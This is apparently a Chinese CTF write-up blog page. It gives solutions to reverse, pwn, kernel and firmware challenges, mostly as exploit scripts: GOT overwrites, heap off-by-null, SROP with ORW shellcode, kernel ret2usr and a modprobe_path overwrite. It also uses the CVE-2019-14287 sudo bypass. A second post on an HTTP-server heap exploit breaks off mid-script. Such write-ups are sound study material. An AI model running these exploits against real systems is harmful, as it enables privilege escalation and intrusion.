temp2=(rc4_decrypted[i%16]&amp;0x1f)&lt;&lt;3 y=temp1|temp2 result=result+str(hex(y))[2:].rjust(2,'0')print(result[-2:]+result[:-2]) rc4解密程序: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#define MAX_KEY 256#define MAX_STR 100int pos_i=0;int pos_j=0;int sbox[256];unsigned char key[MAX_KEY]=&#123;0x8C,0xE5,0x1F,0x93,0x50,0xF4,0x45,0x11,0xA8,0x54,0xE1,0xB5,0xF0,0xA3,0xFB,0xCA&#125;;void init_sbox();unsigned char generate_key();void encryption(unsigned char *plaintext,unsigned char *result);int main()&#123; char str[MAX_STR]=&#123;0xc0,0x5c,0x32,0x57,0x7f,0xdb,0x3f,0x4d,0x94,0xb8,0xfe,0x13,0x7,0xe3,0x55,0x26&#125;; char result[MAX_STR]=&#123;0&#125;; int i; int len; len = strlen(str); encryption((unsigned char *)str,(unsigned char *)result); printf(\"\\n\"); return 0;&#125;void init_sbox()&#123; int i,j; int key_len = strlen((const char *)key); unsigned char temp; for(i=0;i&lt;256;++i) sbox[i]=i; j=0; for(i=0;i&lt;256;++i)&#123; j=(j+sbox[i]+key[i%key_len])%256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125;unsigned char generate_key()&#123; unsigned char temp; int t; pos_i=(pos_i+1)%256; pos_j = (pos_j+sbox[pos_i])%256; temp = sbox[pos_i]; sbox[pos_i] = sbox[pos_j]; sbox[pos_j] = temp; t = (sbox[pos_i]+sbox[pos_j])%256; return sbox[t];&#125;void encryption(unsigned char *plaintext,unsigned char * result)&#123; pos_i = 0; pos_j = 0; int len = strlen((const char *)plaintext); int i=0; init_sbox(); for(i=0;i&lt;len;++i)&#123; result[i]=plaintext[i]^generate_key(); printf(\"%x \",result[i]); &#125; result[i]='\\0';&#125; 3.babyre这道题看上去调用了ZwLoadDriver函数，实际上并没有，动调f7步入一直走会来到一个程序内的函数0x412a20，这个函数中可以看到最后有两个调用分别处理了我们输入的前16字节和后16字节。 image-20210201154453065 为了找到这个加密函数我们分析之前的0x4113ed函数，一直往里走会看到一个关键的标志CIPHER_DLL，使用resource hacker提取出这个加密的dll即可。 image-20210201154632782 然后解密这个dll的函数如下，就是用wow!做密钥的异或解密。 image-20210201154806479 最后在解密出的dll偏移0x4f6de处找到加密逻辑，就是以Ez_5M4_C1pH@r!!!为密钥的sm4加密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154key=\"wow!\"resource_f=open(\"./cipher_text\",\"rb\")resource=resource_f.read()resource_f.close()plain_text=[]i=0for x in resource: plain_text.append(x^ord(key[i])) i=(i+1)%4plain_text=bytes(plain_text)plain_f=open('./plain_text',\"wb\")plain_f.write(plain_text)plain_f.close()SBOX = ['d6', '90', 'e9', 'fe', 'cc', 'e1', '3d', 'b7', '16', 'b6', '14', 'c2', '28', 'fb', '2c', '05', '2b', '67', '9a', '76', '2a', 'be', '04', 'c3', 'aa', '44', '13', '26', '49', '86', '06', '99', '9c', '42', '50', 'f4', '91', 'ef', '98', '7a', '33', '54', '0b', '43', 'ed', 'cf', 'ac', '62', 'e4', 'b3', '1c', 'a9', 'c9', '08', 'e8', '95', '80', 'df', '94', 'fa', '75', '8f', '3f', 'a6', '47', '07', 'a7', 'fc', 'f3', '73', '17', 'ba', '83', '59', '3c', '19', 'e6', '85', '4f', 'a8', '68', '6b', '81', 'b2', '71', '64', 'da', '8b', 'f8', 'eb', '0f', '4b', '70', '56', '9d', '35', '1e', '24', '0e', '5e', '63', '58', 'd1', 'a2', '25', '22', '7c', '3b', '01', '21', '78', '87', 'd4', '00', '46', '57', '9f', 'd3', '27', '52', '4c', '36', '02', 'e7', 'a0', 'c4', 'c8', '9e', 'ea', 'bf', '8a', 'd2', '40', 'c7', '38', 'b5', 'a3', 'f7', 'f2', 'ce', 'f9', '61', '15', 'a1', 'e0', 'ae', '5d', 'a4', '9b', '34', '1a', '55', 'ad', '93', '32', '30', 'f5', '8c', 'b1', 'e3', '1d', 'f6', 'e2', '2e', '82', '66', 'ca', '60', 'c0', '29', '23', 'ab', '0d', '53', '4e', '6f', 'd5', 'db', '37', '45', 'de', 'fd', '8e', '2f', '03', 'ff', '6a', '72', '6d', '6c', '5b', '51', '8d', '1b', 'af', '92', 'bb', 'dd', 'bc', '7f', '11', 'd9', '5c', '41', '1f', '10', '5a', 'd8', '0a', 'c1', '31', '88', 'a5', 'cd', '7b', 'bd', '2d', '74', 'd0', '12', 'b8', 'e5', 'b4', 'b0', '89', '69', '97', '4a', '0c', '96', '77', '7e', '65', 'b9', 'f1', '09', 'c5', '6e', 'c6', '84', '18', 'f0', '7d', 'ec', '3a', 'dc', '4d', '20', '79', 'ee', '5f', '3e', 'd7', 'cb', '39', '48',]FK = ['a3b1bac6', '56aa3350', '677d9197', 'b27022dc']CK = ['00070e15', '1c232a31', '383f464d', '545b6269', '70777e85', '8c939aa1', 'a8afb6bd', 'c4cbd2d9', 'e0e7eef5', 'fc030a11', '181f262d', '343b4249', '50575e65', '6c737a81', '888f969d', 'a4abb2b9', 'c0c7ced5', 'dce3eaf1', 'f8ff060d', '141b2229', '30373e45', '4c535a61', '686f767d', '848b9299', 'a0a7aeb5', 'bcc3cad1', 'd8dfe6ed', 'f4fb0209', '10171e25', '2c333a41', '484f565d', '646b7279']def left(list,n): return list[n:] + list[:n]def group(list, n): for i in range(0, len(list), n): yield list[i:i + n]def xor(a,b): a1 = int(a,16) b1 = int(b,16) if a == b: A = '&#123;:032x&#125;'.format(int(a1^b1)) else: A = '&#123;:08x&#125;'.format(int(a1^b1)) return Adef round_function(k0,k1,k2,k3,rk,mod): k = xor(xor(xor(k1,k2),k3),rk) Tr = T(k,mod) rki = xor(k0,Tr) return rkidef T(A,mod): T = linear(S(A),mod) return Tdef S(A): A1 = [] A2 = [0,0,0,0] for i in group(A,2): A1.append(i) for i in range(4): l = int(A1[i],16) A2[i] = '&#123;:02x&#125;'.format(int(SBOX[l],16)) A2 = ''.join(A2) return A2def linear(B,mod): B1 = list(B) for i in range(8): B1[i] = '&#123;:04b&#125;'.format(int(B1[i],16)) B1 = ''.join(B1) B1_2= left(B1,2) B1_10 = left(B1,10) B1_18 = left(B1,18) B1_24 = left(B1,24) B1_13 = left(B1,13) B1_23 = left(B1,23) if mod == 'enc' or mod == 'dec': BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24) elif mod == 'extend': BX = xor(xor(B1,B1_13),B1_23) else: return \"模式输入错误\" BX = '%x'%int(BX, 2) return BXdef get_key(key): MK = [] for i in group(key,8): MK.append(i) key0 = xor(MK[0],FK[0]) key1 = xor(MK[1],FK[1]) key2 = xor(MK[2],FK[2]) key3 = xor(MK[3],FK[3]) keylist = [key0,key1,key2,key3] rk = [] for i in range(32): a = round_function(keylist[i],keylist[i+1],keylist[i+2],keylist[i+3],CK[i],mod='extend') keylist.append(a) rk.append(a) return rkdef get_sm4_ecb(key,input_data,mod): data = [] rk = get_key(key) for i in group(input_data,8): data.append(i) for i in range(32): if mod == 'enc': ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[i],mod) else: ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[31-i],mod) data.append(ldata) out_data = [data[35],data[34],data[33],data[32]] out_data = ''.join(out_data) return out_datadef get_sm4_cbc(key,input_data,iv,mod): rk = get_key(key) if mod == 'enc': input_data = xor(input_data,iv) data = [] for i in group(input_data,8): data.append(i) for i in range(32): ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[i],mod) data.append(ldata) out_data = [data[35],data[34],data[33],data[32]] out_data = ''.join(out_data) else: data = [] for i in group(input_data,8): data.append(i) for i in range(32): ldata = round_function(data[i],data[i+1],data[i+2],data[i+3],rk[31-i],mod) data.append(ldata) out_data = [data[35],data[34],data[33],data[32]] out_data = ''.join(out_data) out_data = xor(out_data,iv) out_data = '&#123;:032x&#125;'.format(int(out_data, 16)) return out_datacipher_text=b\"\\xEA\\x63\\x58\\xB7\\x8C\\xE2\\xA1\\xE9\\xC5\\x29\\x8F\\x53\\xE8\\x08\\x32\\x59\\xAF\\x1B\\x67\\xAE\\xD9\\xDA\\xCF\\xC4\\x72\\xFF\\xB1\\xEC\\x76\\x73\\xF3\\x06\"key = \"Ez_5M4_C1pH@r!!!\"result=get_sm4_ecb(key = key.encode('utf-8').hex(), input_data = cipher_text[:16].hex(), mod = 'dec')result=bytes.fromhex(result)for x in result: print(chr(x),end=\"\")result=get_sm4_ecb(key = key.encode('utf-8').hex(), input_data = cipher_text[16:].hex(), mod = 'dec')result=bytes.fromhex(result)for x in result: print(chr(x),end=\"\") Pwn1.emarm第一个检测发送一个0x00就可以绕过，然后允许我们输入一个地址，并更改其8字节的内容，由于没有开启FULL RELRO和PIE，直接改GOT表就好。由于ARM的libc基址没有随机化，我们可以先将atoi改为printf利用格式化字符串泄露出基址。然后重新打一次，这次将atoi改为system拿shell。 exp: 123456789101112from pwn import *context.log_level='debug'libc_base=0x4000830000system_addr=libc_base+0x3F2C8sh=remote('183.129.189.60',10012)sh.sendlineafter('passwd:',p8(0))#sh.send(str(0x000000000412020)+'\\x00'+p64(0x0000000004008B0))#泄露基址#sh.sendafter('bye','%9$p')sh.send(str(0x000000000412020)+'\\x00'+p64(system_addr))sh.sendafter('bye','sh\\x00')sh.interactive() 2.ememarmARM的堆题，貌似没有什么检查，利用off by null可以实现double free，然后就可以任意地址写了，同样没有开启FULL RELRO和PIE，可以分配堆块到got表的puts处，这样可以避免堆块头破坏有用的函数，还可以更改掉free，而puts用类似的printf代替即可。由于double free只可进行一次，我们还是先利用格式化字符串泄露libc基址，然后打第二次调用system即可。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *#context.log_level='debug'def add(x,y,if_save): sh.sendlineafter('choice: ','1') sh.sendafter('cx:',x) sh.sendafter('cy:',y) sh.sendlineafter('?',str(if_save))def add_40(x,y,if_save): sh.sendlineafter('choice: ','4') sh.sendafter('cx:',x) sh.sendafter('cy:',y) sh.sendlineafter('?',str(if_save))def edit(index,content): sh.sendlineafter('choice: ','3') sh.sendline(str(index)) sh.send(content)libc_base=0x4000830000system_addr=libc_base+0x3F2C8sh=remote(\"183.129.189.60\",10034)#0x413260sh.send('/bin/sh\\x00'.ljust(0x18,'\\x00'))add_40(p64(0),p64(0),1)add('0','0',1)add_40('0','0',1)add_40('0','0',1)edit(3,'a'*0x18)edit(2,'a'*0x17)add_40(p64(0x412030),'0',0)#add_40('%15$p ','%16$p',1)#3add_40('/bin/sh\\x00','%16$p',1)#3add_40(p64(0x400780),p64(system_addr),1)#4edit(2,p64(0x400780))#libc_base=int(sh.recv(12)[2:],16)-0x206e0#print(hex(libc_base))#system_addr=libc_base+0x3F2C8#add_40('/bin/sh\\x00','/bin/sh\\x00',1)#3#add('0','0',1)#5#edit(4,p64(0x400780)+p64(system_addr))#edit(2,'a')sh.interactive() 3.justcode这道题开了沙箱。允许两个操作，一共执行4次。第一个往整个栈帧上写数据，并打印；第二个更改rbp-0x84处存储的地址上的4个字节，并向rbp-0x80读入0x6c个字节。 我们可以写用1操作在rbp-0x84处留下要改的地址，然后通过2操作来改，但这样总共只能改两次。所以我们可以将__stack_chk_fail改为main函数的地址，然后在1操作中改canary就可以实现任意次任意地址写4字节了，同时还能顺便泄露出rbp的地址，拿到栈地址。 考虑到1操作直接从rsp开始写数据，因此可以构造rop链，并将__stack_chk_fail改为0x400E9A来实现puts函数的调用泄露出libc地址。然后我们就可以把stack_chk_fail改成libc中的gadget了，一个比较合适的gadget是0x24374，它可以将设置rdi与下一个调用，我们将rax设置为setcontext，rdi设置为栈上构造的sigreturnframe，就可以进行orw操作了。 image-20210201162808892 然后就是读rop链到libc中的空白处，进行mprotect的调用将对应地址改为可执行，最后执行orw的shellcode即可。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106from pwn import *context.arch='amd64'context.log_level='debug'shellcode = asm(''' sub rsp, 0x800 push 0x67616c66 mov rdi, rsp xor esi, esi mov eax, 2 syscall cmp eax, 0 js failed mov edi, eax mov rsi, rsp mov edx, 0x100 xor eax, eax syscall mov edx, eax mov rsi, rsp mov edi, 1 mov eax, edi syscall jmp exit failed: push 0x6c696166 mov edi, 1 mov rsi, rsp mov edx, 4 mov eax, edi syscall exit: xor edi, edi mov eax, 231 syscall''' )#sh=process('./justcode')#some gadgets 0x2BD59 0x24374#pause()sh=remote('183.129.189.60',10041)v7=[1,2,1,1]for x in v7: sh.sendline(str(x))sh.sendafter('name:','a'*0xc+p64(0x602038)+'a'*0x74)sh.sendlineafter('id:',str(0x400D4B))sh.sendafter('info:',\"a\"*0x4c)sh.sendafter('name:','a'*0x88+'b')sh.recvuntil('aaaab')sh.recv(7)rbp=u64(sh.recv(6).ljust(8,'\\x00'))-0x70-0x170v7=[1,2,1,2]for x in v7: sh.sendline(str(x))sh.sendafter('name:','a'*0xc+p64(0x602038)+'a'*0x74)sh.sendlineafter('id:',str(0x400E96))sh.sendafter('info:',\"a\"*0x4c)payload=p64(0)+p64(1)+p64(0x602028)+p64(0)*2+p64(0x602048)+p64(0x400E86)+p64(0)*7+p64(0x400D4B)sh.sendafter('name:',payload.ljust(0x89,'a'))sh.recvuntil('check it :')sh.recvline()read_addr=u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))libc_base=read_addr-0xF7310print(hex(libc_base))free_hook2=(libc_base+0x3C67A8)&amp;0xfffffffffffff000syscall_addr=libc_base+0x101580setcontext=libc_base+0x47B85read_addr=libc_base+0xF7310mprotect=libc_base+0x101830v7=[1,2,1,2]for x in v7: sh.sendline(str(x))print(hex(rbp))sh.sendafter('name:','a'*0xc+p64(0x602040)+'a'*0x74)frame=SigreturnFrame()frame.rsp = free_hook2frame.rdi = 0frame.rsi = free_hook2frame.rdx = 0x2000frame.rip = read_addr #: syscall; ret;payload = str(frame)layout=p64(libc_base+0x21112)+p64(free_hook2)+p64(libc_base+0x202f8)+p64(0x2000)+p64(libc_base+0x1b92)+p64(7)+p64(mprotect)+p64(libc_base+0x2a71)pause()sh.sendlineafter('id:',str((libc_base+0x24374)&amp;0xffffffff))sh.send(p64(rbp-0x80-0x48)+p64(0)+p64(setcontext)+p64(0)+payload[0x68:0xb0])sh.send(layout + shellcode)print(sh.recv())sh.interactive() 4.undlcv存在off by null漏洞，并且将堆块地址存储在bss段上，也没开PIE。因此想到使用unlink就可以实现任意地址写，但写的次数一共只有四次，任意地址写的机会只有2次。看到保护为NO RELRO，考虑更改dynamic段中symtab和strtab的地址来实现system的调用。 第一次任意写将strtab改为0x4034a0，symtab改为0x403450。第二次将got表中的atoi改为0x401030，这样调用atoi就会调用第二个参数为0的_dl_runtime _resolve函数，紧接着我们在0x403450处构造虚假的symtab，其中第一项的strtab偏移设置为我们写入的system字符串，随后在0x4034a0处构造虚假的strtab，其中包含了system字符串。 最后发送/bin/sh就可以拿到shell。但拿到shell后发现无权读取flag，考虑sudo相关漏洞，发现sudo的版本满足CVE-2019-14287的要求，于是输入sudo -u#-1 cat flag成功拿到flag。 exp: 123456789101112131415161718192021222324252627282930313233from pwn import *#context.log_level='debug'def add(index): sh.send('1'.ljust(10,'\\x00')) sh.send(str(index).ljust(10,'\\x00'))def edit(index,content): sh.send('2'.ljust(10,'\\x00')) sh.send(str(index).ljust(10,'\\x00')) sh.send(content)def free(index): sh.send('3'.ljust(10,'\\x00')) sh.send(str(index).ljust(10,'\\x00')) #sh=process('./undlcv')sh=remote('183.129.189.60',10013)add(0)add(1)sh.send('4'.ljust(10,'\\x00'))edit(0,p64(0)+p64(0xf1)+p64(0x403480-0x18)+p64(0x403480-0x10)+\"a\"*0xd0+p64(0xf0))free(1)pause()edit(0,\"a\"*0x18+p64(0x4032a0)+p64(0x403440))pause()edit(0,p64(5)+p64(0x4034a0)+p64(6)+p64(0x403450))pause()edit(1,p64(0x401030)+p64(0x401030)+p64(0)*3+p32(1)+p32(0x12)+p64(0)*2+p64(0)*4+p8(0)+\"system\\x00\")pause()sh.send('/bin/sh\\x00')sh.interactive() 内核安全1.ddkernel题目没开smep也没有kaslr。查看ko文件，发现是一个栈溢出，长度检测只检测了最低的字节，保证长度最低字节小于8即可。查看/proc/kallsyms得到相关地址后就可以commit_creds(prepare_kernel_cred)接返回用户态的system(‘/bin/sh’)一把梭。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;#include&lt;stdint.h&gt;#include&lt;sys/ioctl.h&gt;#include&lt;inttypes.h&gt;#include&lt;sys/mman.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/io.h&gt; #include&lt;stdint.h&gt;void save_regs();void root();void get_shell();unsigned long user_cs,user_ss,user_rsp,user_eflags;int main()&#123; int fd,i; char rop[0x100]; save_regs(); fd=open(\"/proc/doudou\",O_RDWR); for(i=0;i&lt;16;i++) rop[i]='a'; *(char **)&amp;rop[16]=(unsigned long)root; *(char **)&amp;rop[24]=0xFFFFFFFF81536FFB;//swapgs;ret *(char **)&amp;rop[32]=0xFFFFFFFF8100C33A;//iretq *(char **)&amp;rop[40]=(unsigned long)get_shell; *(char **)&amp;rop[48]=user_cs; *(char **)&amp;rop[56]=user_eflags; *(char **)&amp;rop[64]=user_rsp; *(char **)&amp;rop[72]=user_ss; write(fd,rop,0x100); return 0;&#125;void save_regs()&#123; asm( \"movq %%cs,%0;\" \"movq %%ss,%1;\" \"movq %%rsp,%2;\" \"pushf;\" \"popq %3;\" :\"=r\"(user_cs),\"=r\"(user_ss),\"=r\"(user_rsp),\"=r\"(user_eflags)::\"memory\");&#125;void root()&#123; char* (*p_k_c)(int); int (*c_c)(char*); p_k_c=0xffffffff8105d157;//prepare_kernel_cred c_c=0xffffffff8105d235;//commit_creds c_c(p_k_c(0));&#125;void get_shell()&#123; system(\"/bin/sh\");&#125; 2.babycall这道题开启了smep但是没开启kaslr。相关函数地址无法直接通过cat /proc/kallsyms查看，可以先将init文件中的gid改为0再查看。 漏洞点在于我们可以更改vuln处存储的地址，然后通过调用号为0x10001的ioctl调用来执行该处地址代码。我们将vuln处改为一个gadget的地址0xffffffff813a3618，选择这个gadget是因为它是8字节对齐的而且ret后面跟的参数也是8字节对齐的，满足栈地址的要求。它执行xchg eax,esp可以实现栈迁移，由于xchg会将不交换的那部分字节置0，所以rsp就会到用户空间中去，我们事先mmap对应位置0x813a3000处的内存空间出来，在其中可以布置好rop链。 由于vmlinux中没有提权所需的函数，所以采取更改modprobe_path的方式提权，利用ROP将modprobe_path处改为/sem.sh即可，这里使用了mov [rsi],rdx这种gadget。运行完exp程序，只要执行以下命令即可。 123456echo -ne &#39;#!&#x2F;bin&#x2F;sh\\n&#x2F;bin&#x2F;chmod 777 &#x2F;flag&#39; &gt; &#x2F;sem.shchmod +x &#x2F;sem.shecho -ne &#39;\\xff\\xff\\xff\\xff&#39; &gt; &#x2F;sirchmod +x &#x2F;sir&#x2F;sircat flag sem.sh会把flag权限改为所有人可读，然后执行一个非法的elf文件就可以触发执行modprobe_path处存储的sem.sh，最终能够读取到flag。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;#include&lt;stdint.h&gt;#include&lt;sys/ioctl.h&gt;#include&lt;inttypes.h&gt;#include&lt;sys/mman.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/io.h&gt; #include&lt;stdint.h&gt;void save_regs();void root();void get_shell();unsigned long user_cs,user_ss,user_rsp,user_eflags;int main()&#123; int fd,i; char a[30],b[9]=\"deadbeef\",*rop;//mod_tree ffffffff82606a80 run_cmd ffffffff810bd625 xchg 0xffffffff813a3618 char *pop_rdi=0xFFFFFFFF81026CAD,*pop_rsi=0xFFFFFFFF8131422E,*pop_rdx=0xFFFFFFFF81512EF6,*mov_crsi_rdx=0xffffffff8103d348,*modprobe=0xFFFFFFFF8265BE00; char path[16]=\"/sem.sh\\x00\"; for(i=0;i&lt;8;i++) b[i]=b[i]-'a'+10; *(char**)&amp;b[8]=0xffffffff813a3618; save_regs(); fd=open(\"/dev/babycall\",O_RDWR); ioctl(fd,0x10001,b); printf(\"1\\n\"); rop=mmap(0x813a3000,0x4000,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,0,0); printf(\"%p\\n\",rop); *(char **)&amp;rop[0+0x618]=pop_rdx; *(char **)&amp;rop[8+0x618+0x2040]=0x68732e6d65732f; *(char **)&amp;rop[16+0x618+0x2040]=pop_rsi; *(char **)&amp;rop[24+0x618+0x2040]=modprobe; *(char **)&amp;rop[32+0x618+0x2040]=mov_crsi_rdx; *(char **)&amp;rop[40+0x618+0x2040]=0xFFFFFFFF810728C4;//swapgs;pop rbp *(char **)&amp;rop[48+0x618+0x2040]=0; *(char **)&amp;rop[56+0x618+0x2040]=0xFFFFFFFF810374EB;//iretq *(char **)&amp;rop[64+0x618+0x2040]=(char*)get_shell; *(char **)&amp;rop[72+0x618+0x2040]=user_cs; *(char **)&amp;rop[80+0x618+0x2040]=user_eflags; *(char **)&amp;rop[88+0x618+0x2040]=user_rsp; *(char **)&amp;rop[96+0x618+0x2040]=user_ss; ioctl(fd,0x10001,rop); return 0;&#125;void save_regs()&#123; asm( \"movq %%cs,%0;\" \"movq %%ss,%1;\" \"movq %%rsp,%2;\" \"pushf;\" \"popq %3;\" :\"=r\"(user_cs),\"=r\"(user_ss),\"=r\"(user_rsp),\"=r\"(user_eflags)::\"memory\");&#125;void root()&#123; char* (*p_k_c)(int); int (*c_c)(char*); p_k_c=0xffffffff810bd150;//prepare_kernel_cred c_c=0xffffffff810bcd60;//commit_creds c_c(p_k_c(0));&#125;void get_shell()&#123; printf(\"1\\n\"); //echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' &gt; /sem.sh //chmod +x /sem.sh //echo -ne '\\xff\\xff\\xff\\xff' &gt; /sir //chmod +x /sir &#125; 固件安全1.nodemcu直接记事本打开搜索flag字符串就可以得到flag。 2.stm先使用BinToHex将文件转为intel HEX的格式，用ida打开，将Processor type设置成ARM Big-endian，然后在Processor options中edit architecture options选择ARMv7-M。 然后在里面一通瞎找，找到hello world字符串，找到调用其的位置就是主要逻辑。关键的加密位于0x314。它将0x344开始的42个字节与0x1E异或后加3，这就是flag了。 image-20210201172116449 12345a=b\"\\x7D\\x77\\x40\\x7A\\x66\\x30\\x2A\\x2F\\x28\\x40\\x7E\\x30\\x33\\x34\\x2C\\x2E\\x2B\\x28\\x34\\x30\\x30\\x7C\\x41\\x34\\x28\\x33\\x7E\\x30\\x34\\x33\\x33\\x30\\x7E\\x2F\\x31\\x2A\\x41\\x7F\\x2F\\x28\\x2E\\x64\"flag=\"\"for x in a: flag=flag+chr((x^0x1e)+3)print(flag) 3.easybiosida打开查看所有字符串，看到有lzma的字样，说明被lzma压缩了。010editor打开查找5D 00 00 00，将之后的内容复制出来，并把末尾大量的0xFF删去，此时可以成功解压缩。 解压缩后用ida打开，查找运行bios输入flag错误时出现的字符串Wrong!，要按宽字符查找才能找到。成功定位到关键逻辑后，发现是一个rc4加密，密钥为OVMF_And_Easy_Bios。解密出字节串后变更为16进制字符串的形式就是flag了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#define MAX_KEY 256#define MAX_STR 100int pos_i=0;int pos_j=0;int sbox[256];unsigned char key[MAX_KEY]=\"OVMF_And_Easy_Bios\";void init_sbox();unsigned char generate_key();void encryption(unsigned char *plaintext,unsigned char *result);int main()&#123; char str[MAX_STR]=&#123;0x46,0x77,0x74,0xB0,0x27,0x8E,0x8F,0x5B,0xE9,0xD8,0x46,0x9C,0x72,0xE7,0x2F,0x5E&#125;; char result[MAX_STR]=&#123;0&#125;; int i; int len; len = strlen(str); encryption((unsigned char *)str,(unsigned char *)result); printf(\"\\n\"); return 0;&#125;void init_sbox()&#123; int i,j; int key_len = strlen((const char *)key); unsigned char temp; for(i=0;i&lt;256;++i) sbox[i]=i; j=0; for(i=0;i&lt;256;++i)&#123; j=(j+sbox[i]+key[i%key_len])%256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125;unsigned char generate_key()&#123; unsigned char temp; int t; pos_i=(pos_i+1)%256; pos_j = (pos_j+sbox[pos_i])%256; temp = sbox[pos_i]; sbox[pos_i] = sbox[pos_j]; sbox[pos_j] = temp; t = (sbox[pos_i]+sbox[pos_j])%256; return sbox[t];&#125;void encryption(unsigned char *plaintext,unsigned char * result)&#123; pos_i = 0; pos_j = 0; int len = strlen((const char *)plaintext); int i=0; init_sbox(); for(i=0;i&lt;len;++i)&#123; result[i]=plaintext[i]^generate_key(); printf(\"%x \",result[i]); &#125; result[i]='\\0';&#125;","tags":[{"name":"CTF","slug":"CTF","permalink":"https://veltavid.github.io/tags/CTF/"}]},{"title":"几道有意思的Pwn题的复现","date":"2021-08-15T06:23:20.000Z","path":"2021/08aa1d853a.html","text":"0.废话拖了好久终于建了自己的博客，第一篇博客决定先把之前打的几场比赛中我看的但没做出来的题复现了。由于本文的撰写时间与复现时间相隔太久，可能会疏漏一些细节。 1. 2021qwb-Ezcloud本题是一个http服务器程序。sub_9536是比较常规的http报文解析函数，它会返回一个指向解析结果结构体的指针，我们记作parsed_result。对于我们来说需要注意的字段只有Content-Type。当这个字段为application/x-www-form-urlencoded时，则服务器会将我们的报文内容进行url解码，然后把解码后的内容存入parsed_result[11]这个指针指向的堆块，并且parsed_result[13]处会存有数据长度。值得注意的是进行该操作的函数当a3为空时就不会进行任何操作。该函数在之后需要转存数据的地方都会用到，记该函数为strdup_a3_2_a1。 image-20210815150353766 若该字段内容为multipart/form-data，则不会parsed_result[11]与parsed_result[13]都将为0。 接着看下去，发现POST和GET方式都解析了/notepad这个路径，GET中还有一个/flag路径。 /flag /flag对应的处理函数会检查报文中Login-ID字段对应的用户权限是否为1来决定是否输出flag。 这里的用户集合使用链表来表示，表示单个用户的结构体如下所示。使用POST方式中的/login可以向用户链表插入用户节点。 因此我们的目标就是伪造一个权限为1的用户节点。 /notepad 这里出现了常规的菜单，如果是POST方式则允许我们增删改note，GET就是显示note内容。漏洞点共有2处，都在new note功能中。 第一个漏洞点是当用户节点中16个note都满了，且next域为空，则还会新增一个note覆盖掉用户节点的next域，这意味着攻击者能够伪造一个用户节点。 第二个漏洞点在接下来的第一个strdup_a3_2_a1，若我们设置的Content-Type为multipart/form-data，则a1+88处的值为0，那么malloc出来的note就不会被初始化，则note的内容指针可能会指向一块堆块，只要这块堆块上残留了堆块指针，我们就能利用GET方式的notepad泄露出堆块地址。比赛时没发现这个洞，导致瞎堆风水了很久。 利用思路 本题的难点在于虚假的用户节点内容不可控。因此为了获得可控的用户节点我们需要利用堆风水(玄学)做出一个合适的堆块布局，使得分配完0x20大小的note之后，接下来分配的存储note数据堆块正好在其之后，那么我们就可以覆盖虚假用户节点的next域，使其指向一块我们布置好数据的堆块区域。至于如何做就只能边调边试了，过程比较痛苦。exp如下所示。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *from urllib import quote#context.log_level='debug'def add(id_u,content,mode): if(mode==1): encoded_content=quote(content) base=\"POST /notepad HTTP/1.1\\r\\nContent-Length: %d\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\"%(len(encoded_content)) base+=\"Login-ID: %s\\r\\nNote-Operation: %s\\r\\n\\r\\n\"%(quote(id_u),quote(\"new note\")) base+=encoded_content else: base=\"POST /notepad HTTP/1.1\\r\\nContent-Length: %d\\r\\nContent-Type: multipart/form-data\\r\\n\"%(len(content)) base+=\"Login-ID: %s\\r\\nNote-Operation: %s\\r\\n\\r\\n\"%(quote(id_u),quote(\"new note\")) base+=content sh.send(base.ljust(0x10000,'\\x00')) sh.recvuntil('operation done!&lt;/p&gt;')def free(id_u,index): base=\"POST /notepad HTTP/1.1\\r\\n\" base+=\"Login-ID: %s\\r\\nNote-ID: %d\\r\\nNote-Operation: %s\\r\\n\\r\\n\"%(quote(id_u),index,quote(\"delete note\")) sh.send(base.ljust(0x10000,'\\x00')) sh.recvuntil('operation done!&lt;/p&gt;')def edit(id_u,index,content): encoded_content=quote(content) base=\"POST /notepad HTTP/1.1\\r\\nContent-Length: %d\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\"%(len(encoded_content)) base+=\"Login-ID: %s\\r\\nNote-ID: %d\\r\\nNote-Operation: %s\\r\\n\\r\\n\"%(quote(id_u),index,quote(\"edit note\")) base+=encoded_content sh.send(base.ljust(0x10000,'\\x00'))def show(id_u): encoded_content=quote('') base=\"GET /notepad HTTP/1.1\\r\\nhost: 123\\r\\nContent-Length: %d\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\"%(len(encoded_content)) base+=\"Login-ID: %s\\r\\nNote-Operation: %s\\r\\n\\r\\n\"%(quote(id_u),quote(\"new note\")) base+=encoded_content 